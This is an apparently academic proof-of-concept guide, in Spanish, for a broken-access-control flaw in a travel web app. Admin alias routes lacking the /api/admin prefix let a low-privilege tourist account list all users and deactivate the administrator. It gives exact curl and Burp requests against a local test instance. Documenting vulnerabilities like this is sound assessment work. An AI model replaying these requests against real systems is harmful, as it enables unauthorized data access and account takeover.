# Guía de Prueba de Concepto: PoC-09 — Escalamiento Vertical de Privilegios por Rutas Duales Desprotegidas

**Vulnerabilidad:** H-08 — Falta de Restricción RBAC en Rutas Alias Administrativas (`/api/usuarios`, `/api/comisiones`)  
**CWE:** CWE-284 (Improper Access Control) / CWE-269 (Improper Privilege Management)  
**OWASP Top 10:2021:** A01:2021 - Broken Access Control  
**Severidad:** Crítica  
**Clasificación:** CONFIRMADO EN CÓDIGO  

---

## 1. Descripción Técnica del Fallo
En `AdminApiController.java:67-87`, varios métodos que ejecutan operaciones administrativas críticas (gestión de usuarios, desactivación de cuentas y consulta de comisiones de plataforma) se mapean con rutas duales:
- Ruta formal: `/api/admin/usuarios`, `/api/admin/usuario/eliminar`, `/api/admin/comisiones`.
- Ruta alias: `/api/usuarios`, `/api/usuario/eliminar`, `/api/comisiones`.

En `SecurityConfig.java:168`, la regla de autorización restringe únicamente el prefijo de administrador:
```java
.requestMatchers("/api/admin/**").hasRole("ADMIN")
```

Las rutas alternativas sin el prefijo `/api/admin/` caen en la regla general de cierre:
```java
.anyRequest().authenticated()
```

Como consecuencia, cualquier usuario autenticado con el rol más bajo del sistema (`ROLE_TURISTA`) puede acceder a `/api/usuarios` para volcar la lista completa de usuarios y credenciales del sistema, o enviar una petición `POST /api/usuario/eliminar?idUsuario=1` para desactivar la cuenta del Administrador General.

---

## 2. Precondiciones
1. App local levantada en `http://127.0.0.1:8080`.
2. Una cuenta válida con rol `ROLE_TURISTA` (`turista_a@test.local / TestTurista#2026`).

---

## 3. Procedimiento de Ejecución Manual (Request Exacta)

### Paso 1: Iniciar Sesión como Turista y Guardar la Cookie
```bash
curl -i -s -c cookies_turista.txt -X POST "http://127.0.0.1:8080/api/auth/login" \
     -H "Content-Type: application/json" \
     -d '{"correo":"turista_a@test.local","clave":"TestTurista#2026","rolEsperado":"TURISTA"}'
```

### Paso 2: Intentar Acceder a la Ruta Formal Protegida `/api/admin/usuarios` (Control Positivo de Bloqueo)
```bash
curl -i -s -b cookies_turista.txt -X GET "http://127.0.0.1:8080/api/admin/usuarios"
```
*(Debe responder `403 Forbidden` debido a la regla `.requestMatchers("/api/admin/**").hasRole("ADMIN")`)*.

### Paso 3: Acceder a la Ruta Alias Desprotegida `/api/usuarios` con el Mismo Rol Turista (Explotación de Escalamiento)
```bash
curl -i -s -b cookies_turista.txt -X GET "http://127.0.0.1:8080/api/usuarios"
```

### Formato para Burp Suite Repeater:
```http
GET /api/usuarios HTTP/1.1
Host: 127.0.0.1:8080
Cookie: JSESSIONID=<COOKIE_DEL_TURISTA>
Accept: application/json
Connection: close

```

---

## 4. Respuesta Esperada
- **Paso 2 (`/api/admin/usuarios`):**
  - Código: `403 Forbidden`
  - Body: `{"status":"error","code":"FORBIDDEN","message":"Acceso restringido: no posee los permisos necesarios"}`
- **Paso 3 (`/api/usuarios`):**
  - Código: **`200 OK`**
  - Body: Devuelve el listado completo de todos los usuarios de la base de datos (administradores, agencias, turistas) con sus nombres, emails, roles y fechas de registro:
    ```json
    {
      "status": "success",
      "data": [
        {"id": 1, "nombre": "Administrador Travelink", "email": "admin@travelink.pe", "tipo": "Administrador", "estado": "ACTIVO"},
        {"id": 101, "nombre": "Turista A Test", "email": "turista_a@test.local", "tipo": "Turista", "estado": "ACTIVO"}
      ]
    }
    ```
- **Análisis de Seguridad:** Se demuestra un bypass de autorización por discrepancia de rutas (Path Traversal / Route Alias Discrepancy), otorgando acceso a funciones administrativas a un rol sin privilegios.

---

## 5. Qué Capturar para el Informe Académico
1. **Burp Suite / Terminal:** Captura comparativa:
   - Panel izquierdo: `GET /api/admin/usuarios` retornando `403 Forbidden`.
   - Panel derecho: `GET /api/usuarios` retornando `200 OK` con la lista de usuarios completa usando exactamente la misma cookie de sesión del Turista A.
2. **Editor de Código:** Captura de `AdminApiController.java` (L67) mostrando el array de rutas `@RequestMapping({"/api/admin/usuarios", "/api/usuarios", ...})` contrastado con `SecurityConfig.java` (L168).

---

## 6. Resultado Real (Completar tras la prueba)
*(Espacio reservado para el evaluador)*

```text

```
